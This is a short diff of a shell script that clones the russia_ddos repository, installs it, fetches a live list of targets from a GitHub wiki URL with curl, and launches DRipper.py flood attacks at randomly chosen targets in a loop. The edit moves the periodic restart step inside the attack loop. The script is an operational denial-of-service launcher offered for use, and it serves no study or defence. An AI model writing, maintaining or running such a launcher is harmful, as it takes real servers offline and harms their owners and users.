@@ -32,11 +32,8 @@ do
    git clone https://github.com/alexmon1989/russia_ddos.git
    cd russia_ddos
    pip install -r requirements.txt
-
-   # Restart DRipper_main after N seconds (default 600s = 10m)
-   sleep $restart_time
-   pkill -f DRipper.py
    
+   # Number of targets in DRipper_targets
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
 
    # Get multiple random numbers to choose multiple targets from DRipper_targets
@@ -53,5 +50,9 @@ do
             
              # Launch DRipper
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
+             
+             # Restart DRipper_main after N seconds (default 600s = 10m)
+             sleep $restart_time
+             pkill -f DRipper.py
       done
 done
